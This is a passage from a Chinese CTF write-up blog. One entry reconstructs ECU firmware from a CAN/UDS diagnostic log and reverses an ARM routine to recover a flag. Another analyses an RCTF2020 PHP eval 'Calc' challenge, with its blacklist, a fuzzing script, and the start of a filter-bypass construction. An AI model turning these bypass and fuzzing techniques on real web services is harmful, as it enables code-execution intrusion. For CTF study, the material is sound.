<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwNjE1NjU2Nw==">https://blog.csdn.net/Breeze_CAT/article/details/106156567<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Hint <a href="https://wenku.baidu.com/view/dd8105d46429647d27284b73f242336c1eb930b8.html" target="_blank" rel="noopener"><code>ISO 15765-2</code></a> <a href="https://blog.csdn.net/qfmzhu/article/details/105716337" target="_blank" rel="noopener"><code>ISO 14229-1</code></a></p>
<p>解压得到<code>ecu_can_log.asc</code></p>
<p>进行简单的信息检索得知是can汽车协议</p>
<figure class="highlight asc"><table><tr><td class="code"><pre><span class="line">date Thu Apr <span class="number">2</span> <span class="number">10</span>:<span class="number">37</span>:<span class="number">15.950</span> am <span class="number">2020</span></span><br><span class="line">base hex  timestamps absolute</span><br><span class="line"><span class="built_in">int</span>ernal events logged</span><br><span class="line"><span class="comment">// version 8.2.1</span></span><br><span class="line">   <span class="number">0.005921</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">1.005921</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">2.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">3.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">4.000621</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(01) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">   <span class="number">4.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">5.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">6.005923</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">7.005923</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">8.000537</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(02) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">   <span class="number">8.005923</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">9.005924</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">9.498709</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">10</span> <span class="number">02</span> AA AA AA AA AA  Length = <span class="number">0</span> BitCount = <span class="number">116</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(03) Atom 7DF-&gt;7DF : SF Length:   02         [ 10 02 ]</span></span><br><span class="line">   <span class="number">9.499693</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">06</span> <span class="number">50</span> <span class="number">02</span> <span class="number">00</span> <span class="number">32</span> <span class="number">01</span> F4 <span class="number">00</span>  Length = <span class="number">235910</span> BitCount = <span class="number">122</span> ID = <span class="number">1968</span></span><br><span class="line">   <span class="number">9.740585</span> <span class="number">1</span>  <span class="number">730</span>             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">27</span> <span class="number">05</span> AA AA AA AA AA  Length = <span class="number">222015</span> BitCount = <span class="number">114</span> ID = <span class="number">1840</span></span><br><span class="line">   ......</span><br><span class="line">  <span class="number">10.323695</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">05</span> <span class="number">71</span> <span class="number">01</span> FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">233910</span> BitCount = <span class="number">121</span> ID = <span class="number">1968</span></span><br><span class="line">  <span class="number">10.325697</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">11</span> <span class="number">01</span> AA AA AA AA AA  Length = <span class="number">0</span> BitCount = <span class="number">115</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(04) Atom 7DF-&gt;7DF : SF Length:   02         [ 11 01 ]</span></span><br><span class="line">  <span class="number">10.326689</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">03</span> <span class="number">7</span>F <span class="number">11</span> <span class="number">78</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">233910</span> BitCount = <span class="number">121</span> ID = <span class="number">1968</span></span><br><span class="line">  <span class="number">11.005924</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">11.326752</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">02</span> <span class="number">51</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">235910</span> BitCount = <span class="number">122</span> ID = <span class="number">1968</span></span><br><span class="line">  <span class="number">12.000742</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(05) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">  <span class="number">12.005925</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">13.005925</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">14.005925</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">15.005926</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">16.000532</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(06) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">  <span class="number">16.005926</span> CAN <span class="number">1</span> Status:chip status error active</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/27/bBOJLIitA2WF5DG.png" alt="463990_GFK2CVP2Z4FK66X.jpg"></p>
<p>图片提示是ARM芯片</p>
<p>从<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poeW9uZ3F1YW4vYXJ0aWNsZS9kZXRhaWxzLzgwMjEyMTgw">这篇博客<i class="fa fa-external-link-alt"></i></span>可以得知从左到右依次是：时间戳、CAN通道编号、帧ID（16进制）、帧方向（发送或接收）、d。之后跟的DLC、数据。</p>
<p>我们只需要帧方向和数据，所以使用正则<code>[RT]x {3}d 8[ 0-9A-F]{24}</code>提取出所有帧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00</span><br><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00</span><br><span class="line">Tx   d 8 02 10 02 AA AA AA AA AA</span><br><span class="line">Rx   d 8 06 50 02 00 32 01 F4 00</span><br><span class="line">Tx   d 8 02 27 05 AA AA AA AA AA</span><br><span class="line">Rx   d 8 06 67 05 11 22 33 44 00</span><br><span class="line">Tx   d 8 06 27 06 EE DD CC BB AA</span><br><span class="line">Rx   d 8 02 67 06 00 00 00 00 00</span><br><span class="line">Tx   d 8 10 0D 31 01 FF 00 44 08</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">Tx   d 8 21 00 00 00 00 00 20 00</span><br><span class="line">Rx   d 8 05 71 01 FF 00 00 00 00</span><br><span class="line">Tx   d 8 10 0B 34 00 44 08 00 00</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">Tx   d 8 21 00 00 00 20 00 AA AA</span><br><span class="line">Rx   d 8 04 74 20 01 02 00 00 00</span><br><span class="line">Tx   d 8 10 82 36 01 28 04 00 20</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">Tx   d 8 21 45 01 00 08 21 03 00</span><br><span class="line">Tx   d 8 22 08 23 03 00 08 27 03</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><code>ISO 15765-2</code>是UDS网络传输层协议</p>
<p><img src="https://i.loli.net/2020/05/27/zYSyuLPtlsdc59p.png" alt="image.png"></p>
<p>如<code>Tx   d 8 02 3E 80 00 00 00 00 00</code></p>
<p>字节1为02，代表单帧(0)、数据长度2(2)，即<code>3E 80</code>就是协议的数据</p>
<p>协议中不存在字节为<code>31</code> <code>32</code>的情况，基本都是单帧和连续帧，所以我们可以忽略掉流控</p>
<p><code>ISO 14229-1</code>是UDS统一诊断服务</p>
<p><img src="https://img-blog.csdnimg.cn/2020042320333967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FmbXpodQ==,size_16,color_FFFFFF,t_70" alt=""></p>
<blockquote>
<p>发送方发送：<code>SID</code> + <code>数据</code></p>
<p>接收方回复：</p>
<ul>
<li>肯定：<code>SID+40</code> + <code>数据</code></li>
<li>否定：<code>7F</code> + <code>SID</code> + <code>NRC</code></li>
</ul>
</blockquote>
<p>如这两行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tx   d 8 02 10 02 AA AA AA AA AA</span><br><span class="line">Rx   d 8 06 50 02 00 32 01 F4 00</span><br></pre></td></tr></table></figure>

<p>发送方发送<code>10 02</code>，<code>SID</code>=<code>10</code>代表诊断会话控制服务(DiagnosticSessionControl)，<code>02</code>是协议的数据</p>
<p>接收方回复<code>50 02 00 32 01 F4</code>，这里<code>SID+40</code>==<code>50</code>，表示肯定，后面<code>02 00 32 01 F4</code>是数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tx   d 8 02 10 02 AA AA AA AA AA  10服务 诊断会话控制</span><br><span class="line">Rx   d 8 06 50 02 00 32 01 F4 00  请求成功</span><br><span class="line">Tx   d 8 02 27 05 AA AA AA AA AA  27服务 安全访问-5</span><br><span class="line">Rx   d 8 06 67 05 11 22 33 44 00  请求成功，返回秘钥</span><br><span class="line">Tx   d 8 06 27 06 EE DD CC BB AA  27服务 安全访问-6，计算秘钥返回结果</span><br><span class="line">Rx   d 8 02 67 06 00 00 00 00 00  结果校验无误，通过安全校验</span><br><span class="line">Tx   d 8 10 0D 31 01 FF 00 44 08  31服务 例行程序控制，擦除数据0x8000000</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 00 00 00 00 00 20 00  31服务 例行程序控制接上文，擦除数据0x8000000</span><br><span class="line">Rx   d 8 05 71 01 FF 00 00 00 00  擦除成功</span><br><span class="line">Tx   d 8 10 0B 34 00 44 08 00 00  34服务 请求下载，下载到0x8000000</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 00 00 00 20 00 AA AA  34服务 请求下载接上文，下载到0x8000000</span><br><span class="line">Rx   d 8 04 74 20 01 02 00 00 00  成功，接受下载请求</span><br><span class="line">Tx   d 8 10 82 36 01 28 04 00 20  36服务 开启数据传输，长度0x82，第一次传输</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 45 01 00 08 21 03 00  接下来是持续发送数据直到发送结束（编号21-2f之后从21重新开始）</span><br><span class="line">Tx   d 8 22 08 23 03 00 08 27 03</span><br><span class="line">Tx   d 8 23 00 08 2B 03 00 08 2F</span><br><span class="line">        ···    ···    ···    ···</span><br><span class="line">Tx   d 8 22 08 5F 01 00 08 AA AA  第一次数据传输结束</span><br><span class="line">Rx   d 8 03 7F 36 78 00 00 00 00  阻塞</span><br><span class="line">Rx   d 8 02 76 01 00 00 00 00 00  成功</span><br><span class="line">Tx   d 8 10 82 36 02 5F 01 00 08  第二次数据传输开始，长度还是0x82,下面相同</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 5F 01 00 08 5F 01 00 </span><br><span class="line">        ···  一共传输了0x40次  ···</span><br><span class="line">Rx   d 8 02 76 40 00 00 00 00 00  最后一次传输成功</span><br><span class="line">Tx   d 8 02 37 01 AA AA AA AA AA  37服务 传输结束</span><br><span class="line">Rx   d 8 06 77 01 C6 B6 5E 10 00  传输结束成功</span><br><span class="line">Tx   d 8 04 31 01 DF FF AA AA AA  31服务 例行程序控制，一些操作</span><br><span class="line">Rx   d 8 03 7F 31 78 00 00 00 00  阻塞</span><br><span class="line">Rx   d 8 05 71 01 DF FF 00 00 00  成功</span><br><span class="line">Tx   d 8 04 31 01 FF 01 AA AA AA  31服务 例行程序控制，执行刚刚传输的东西</span><br><span class="line">Rx   d 8 05 71 01 FF 01 00 00 00  成功</span><br><span class="line">Tx   d 8 02 11 01 AA AA AA AA AA  11服务 ECU复位，重启ECU</span><br><span class="line">Rx   d 8 03 7F 11 78 00 00 00 00  阻塞</span><br><span class="line">Rx   d 8 02 51 01 00 00 00 00 00  成功</span><br><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00  3E服务 回话保持心跳包</span><br><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00  3E服务 回话保持心跳包</span><br></pre></td></tr></table></figure>

<p>大佬博客的协议分析如上</p>
<p>所以我们需要的是请求下载的东西。</p>
<p>先把数据传输的部分提出来，也就是从15行开始，到第1552行</p>
<p>再用正则<code>^Tx.+?$</code>单独将发送方的帧提出来</p>
<p>编写脚本将数据提出来保存到文件中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'TxData.dat'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    frames = f.readlines()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">hexdata=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> frames:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> frame.startswith(<span class="string">'Tx   d 8 10 82 36'</span>): <span class="comment"># 开始发送帧，19帧一组</span></span><br><span class="line">        i=<span class="number">1</span></span><br><span class="line">        hexdata+=frame[<span class="number">21</span>:].strip()+<span class="string">' '</span> <span class="comment"># ^Tx   d 8 10 82 36 .. (.+?)$</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">19</span>: <span class="comment"># 最后一帧</span></span><br><span class="line">        hexdata+=frame[<span class="number">12</span>:<span class="number">26</span>].strip()+<span class="string">' '</span> <span class="comment"># ^Tx   d 8 2. (.+?) .. ..$</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hexdata+=frame[<span class="number">12</span>:].strip()+<span class="string">' '</span> <span class="comment"># ^Tx   d 8 2. (.+?)$</span></span><br><span class="line">print(hexdata)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'hexdata.dat'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hexdata)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">bytedata=[]</span><br><span class="line"><span class="keyword">while</span>(i&lt;len(hexdata)):</span><br><span class="line">    bytedata.append(int(hexdata[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    i+=<span class="number">3</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'bytedata.dat'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bytes(bytedata))</span><br></pre></td></tr></table></figure>

<p>直接打开文件看的话会发现一个<code>flag{canoecr7-zd9h-1emi-or8m-f8vm2od81nfk}</code></p>
<p>但是这不是真正的flag</p>
<p>根据图片提示的ARM，将其导入IDA，使用<code>ARM Little-endian</code>，开始地址<code>0x8000000</code>大小为<code>0x2000</code>，Thumb=0x1</p>
<p>得到flag相关函数的伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_8000168</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+4h] [bp-34h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  sub_800120C(&amp;v3, <span class="string">"flag&#123;canoecr7-zd9h-1emi-or8m-f8vm2od81nfk&#125;"</span>, <span class="number">44</span>);</span><br><span class="line">  sub_8001256(v1, &amp;v3);</span><br><span class="line">  v1 += <span class="number">5</span>; <span class="comment">// 去掉了 flag&#123;</span></span><br><span class="line">  v1[<span class="number">2</span>] -= <span class="number">13</span>;</span><br><span class="line">  v1[<span class="number">11</span>] -= <span class="number">5</span>;</span><br><span class="line">  v1[<span class="number">15</span>] -= <span class="number">44</span>;</span><br><span class="line">  v1[<span class="number">3</span>] -= <span class="number">11</span>;</span><br><span class="line">  v1[<span class="number">5</span>] -= <span class="number">48</span>;</span><br><span class="line">  v1[<span class="number">7</span>] += <span class="number">43</span>;</span><br><span class="line">  v1[<span class="number">28</span>] += <span class="number">50</span>;</span><br><span class="line">  v1[<span class="number">31</span>] += <span class="number">46</span>;</span><br><span class="line">  v1[<span class="number">19</span>] -= <span class="number">13</span>;</span><br><span class="line">  v1[<span class="number">20</span>] -= <span class="number">66</span>;</span><br><span class="line">  v1[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">  v1[<span class="number">29</span>] -= <span class="number">55</span>;</span><br><span class="line">  v1[<span class="number">24</span>] -= <span class="number">51</span>;</span><br><span class="line">  v1[<span class="number">9</span>] -= <span class="number">23</span>;</span><br><span class="line">  v1[<span class="number">25</span>] -= <span class="number">6</span>;</span><br><span class="line">  v1[<span class="number">27</span>] -= <span class="number">60</span>;</span><br><span class="line">  v1[<span class="number">4</span>] -= <span class="number">52</span>;</span><br><span class="line">  v1[<span class="number">6</span>] -= <span class="number">14</span>;</span><br><span class="line">  v1[<span class="number">30</span>] -= <span class="number">52</span>;</span><br><span class="line">  v1[<span class="number">22</span>] -= <span class="number">58</span>;</span><br><span class="line">  v1[<span class="number">12</span>] -= <span class="number">48</span>;</span><br><span class="line">  v1[<span class="number">16</span>] -= <span class="number">56</span>;</span><br><span class="line">  v1[<span class="number">34</span>] -= <span class="number">53</span>;</span><br><span class="line">  *v1 -= <span class="number">48</span>;</span><br><span class="line">  v1[<span class="number">14</span>] += <span class="number">3</span>;</span><br><span class="line">  v1[<span class="number">17</span>] -= <span class="number">5</span>;</span><br><span class="line">  v1[<span class="number">33</span>] -= <span class="number">55</span>;</span><br><span class="line">  v1[<span class="number">35</span>] -= <span class="number">56</span>;</span><br><span class="line">  v1[<span class="number">10</span>] -= <span class="number">2</span>;</span><br><span class="line">  v1[<span class="number">26</span>] -= <span class="number">67</span>;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)v1[<span class="number">21</span>] - <span class="number">6</span>;</span><br><span class="line">  v1[<span class="number">21</span>] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用python解出</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">'canoecr7-zd9h-1emi-or8m-f8vm2od81nfk'</span></span><br><span class="line">v1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    v1.append(ord(i))</span><br><span class="line">v1[<span class="number">2</span>] -= <span class="number">13</span> </span><br><span class="line">v1[<span class="number">11</span>] -= <span class="number">5</span> </span><br><span class="line">v1[<span class="number">15</span>] -= <span class="number">44</span> </span><br><span class="line">v1[<span class="number">3</span>] -= <span class="number">11</span> </span><br><span class="line">v1[<span class="number">5</span>] -= <span class="number">48</span> </span><br><span class="line">v1[<span class="number">7</span>] += <span class="number">43</span> </span><br><span class="line">v1[<span class="number">28</span>] += <span class="number">50</span> </span><br><span class="line">v1[<span class="number">31</span>] += <span class="number">46</span> </span><br><span class="line">v1[<span class="number">19</span>] -= <span class="number">13</span> </span><br><span class="line">v1[<span class="number">20</span>] -= <span class="number">66</span> </span><br><span class="line">v1[<span class="number">1</span>] += <span class="number">3</span> </span><br><span class="line">v1[<span class="number">29</span>] -= <span class="number">55</span> </span><br><span class="line">v1[<span class="number">24</span>] -= <span class="number">51</span> </span><br><span class="line">v1[<span class="number">9</span>] -= <span class="number">23</span> </span><br><span class="line">v1[<span class="number">25</span>] -= <span class="number">6</span> </span><br><span class="line">v1[<span class="number">27</span>] -= <span class="number">60</span> </span><br><span class="line">v1[<span class="number">4</span>] -= <span class="number">52</span> </span><br><span class="line">v1[<span class="number">6</span>] -= <span class="number">14</span> </span><br><span class="line">v1[<span class="number">30</span>] -= <span class="number">52</span> </span><br><span class="line">v1[<span class="number">22</span>] -= <span class="number">58</span> </span><br><span class="line">v1[<span class="number">12</span>] -= <span class="number">48</span> </span><br><span class="line">v1[<span class="number">16</span>] -= <span class="number">56</span> </span><br><span class="line">v1[<span class="number">34</span>] -= <span class="number">53</span> </span><br><span class="line">v1[<span class="number">0</span>] -= <span class="number">48</span> </span><br><span class="line">v1[<span class="number">14</span>] += <span class="number">3</span> </span><br><span class="line">v1[<span class="number">17</span>] -= <span class="number">5</span> </span><br><span class="line">v1[<span class="number">33</span>] -= <span class="number">55</span> </span><br><span class="line">v1[<span class="number">35</span>] -= <span class="number">56</span> </span><br><span class="line">v1[<span class="number">10</span>] -= <span class="number">2</span> </span><br><span class="line">v1[<span class="number">26</span>] -= <span class="number">67</span></span><br><span class="line">result = (v1[<span class="number">21</span>]&amp;<span class="number">0xff</span>) - <span class="number">6</span></span><br><span class="line">v1[<span class="number">21</span>] = result</span><br><span class="line">print(<span class="string">'flag&#123;'</span>,end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v1:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">'&#125;'</span>)</span><br><span class="line"><span class="comment"># flag&#123;3dad13db-cb48-495d-b023-3231d80f1713&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始编写todolist前后端</title>
    <url>/2020/05/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99todolist/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码查看" /><label>请输入密码查看</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="c9035049f3a588fdb66d07576d1db3be551ce008d2d3ed3e282de9dbbe0f68ed"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>todolist</tag>
        <tag>flask</tag>
        <tag>python</tag>
        <tag>html</tag>
        <tag>javascript</tag>
        <tag>css</tag>
        <tag>vue</tag>
        <tag>electron</tag>
        <tag>前端</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2020_Web&amp;Misc</title>
    <url>/2020/06/01/RCTF2020-Web-Misc/</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnJvaXMuaW8vMjAyMC9yY3RmLTIwMjAtb2ZmaWNpYWwtd3JpdGV1cC8=">=&gt; 官方wp<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Calc"><a href="#Calc" class="headerlink" title="Calc"></a>Calc</h3><p><span class="exturl" data-url="aHR0cDovLzEyNC4xNTYuMTQwLjkwOjgwODEvY2FsYy5waHA=">http://124.156.140.90:8081/calc.php<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;[a-z]&#39;, &#39;[\x7f-\xff]&#39;, &#39;\s&#39;,&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;, &#39;_&#39;, &#39;\\\\&#39;,&#39;\^&#39;, &#39;,&#39;]</span><br></pre></td></tr></table></figure>

<p><code>fuzz.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://124.156.140.90:8081/calc.php?num=%'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    fuzzcode = hex(i)[<span class="number">2</span>:]</span><br><span class="line">    bytecode = str(bytes([i]))[<span class="number">1</span>:]</span><br><span class="line">    r = requests.get(url + fuzzcode)</span><br><span class="line">    print(<span class="string">f'<span class="subst">&#123;bytecode&#125;</span> : <span class="subst">&#123;r.text&#125;</span>'</span>)</span><br></pre></td></tr></table></figure>

<p>可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;[\x00-\x08]&#39;, &#39;\t&#39;,&#39;[\x10-\x1f]&#39;, &#39;!&#39;, &#39;#&#39;, &#39;%&#39;, &#39;&amp;&#39;, &#39;(&#39;,&#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;-&#39;, &#39;.&#39;, &#39;&#x2F;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;&#x3D;&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;&#123;&#39;, &#39;|&#39;, &#39;&#125;&#39;, &#39;~&#39;]</span><br></pre></td></tr></table></figure>

<p>可以看到<code>与&amp;</code> <code>或|</code> <code>非~</code>都可以用，数字和括号<code>(){}</code>也都可以用，字符串连接符<code>.</code>也可以用，经过队友<code>@Tyaoo</code>的尝试，如下构造出了字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((1).(1))&#123;0&#125; &#x3D;&gt; 1</span><br><span class="line">((1.1).(1))&#123;1&#125; &#x3D;&gt; .</span><br><span class="line">(((1.1).(1))&#123;1&#125;)&amp;(((4).(1))&#123;0&#125;) &#x3D;&gt; $</span><br></pre></td></tr></table></figure>

<p>然后就想到了科学计数法，构造出<code>E</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((1).(0.00001))&#123;4&#125; &#x3D;&gt; E</span><br></pre></td></tr></table></figure>

<blockquote>
